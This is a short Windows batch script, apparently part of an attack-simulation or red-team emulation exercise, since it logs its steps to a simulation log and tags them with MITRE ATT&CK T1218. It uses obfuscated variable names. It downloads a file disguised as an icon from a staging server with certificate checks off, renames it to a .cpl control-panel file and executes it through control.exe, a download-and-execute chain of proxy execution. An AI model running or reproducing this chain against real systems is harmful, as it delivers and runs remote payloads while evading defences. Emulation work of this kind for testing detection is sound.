@echo off
SETLOCAL EnableDelayedExpansion

SET zhlbtk=%APPDATA%\10892\256bdf0f
SET mrnxft=078be0f7.txt
SET qkdjsw=https://10.0.0.49/stage/2/icon.png?10892-7
SET vcopla=BALAM-S2B
SET ewfiug=10892
SET xtnqro=7
SET bydlz=%PUBLIC%\\macula-simulations.log

SET tsvar=!DATE!/!TIME!

echo [!tsvar!][DEBUG][!vcopla!][!ewfiug!]: heartbeat_start>> "!bydlz!" 2>nul

curl -k -s -o "!zhlbtk!\!mrnxft!" "!qkdjsw!"

echo [!tsvar!][DEBUG][!vcopla!][!ewfiug!]: heartbeat_complete>> "!bydlz!" 2>nul

echo [!tsvar!][DEBUG][!vcopla!][!ewfiug!]: chdir_start>> "!bydlz!" 2>nul
cd /d "!zhlbtk!" >nul 2>&1
if errorlevel 1 ( set chdir_r=1 ) else ( set chdir_r=0 )
echo [!tsvar!][DEBUG][!vcopla!][!ewfiug!]: chdir_result=!chdir_r!>> "!bydlz!" 2>nul

echo [!tsvar!][DEBUG][!vcopla!][!ewfiug!]: rename_start>> "!bydlz!" 2>nul
ren "!mrnxft!" "!mrnxft!.cpl"
if errorlevel 1 ( set ren_r=1 ) else ( set ren_r=0 )
echo [!tsvar!][DEBUG][!vcopla!][!ewfiug!]: rename_complete=!ren_r!>> "!bydlz!" 2>nul

echo [!tsvar!][DEBUG][!vcopla!][!ewfiug!]: controlexec_start>> "!bydlz!" 2>nul
control.exe "!mrnxft!.cpl"
set exec_rc=!errorlevel!
echo [!tsvar!][DEBUG][!vcopla!][!ewfiug!]: controlexec_result=!exec_rc!>> "!bydlz!" 2>nul

set ttp_ts=%date% %time%
if !exec_rc! neq 0 (
  echo [!ttp_ts!][TTP][!vcopla!][!ewfiug!]: T1218^|System Binary Proxy Execution=[FAIL]:[lolbin_execution_failed]>> "!bydlz!" 2>nul
) else (
  echo [!ttp_ts!][TTP][!vcopla!][!ewfiug!]: T1218^|System Binary Proxy Execution=[OK]:[]>> "!bydlz!" 2>nul
)

ENDLOCAL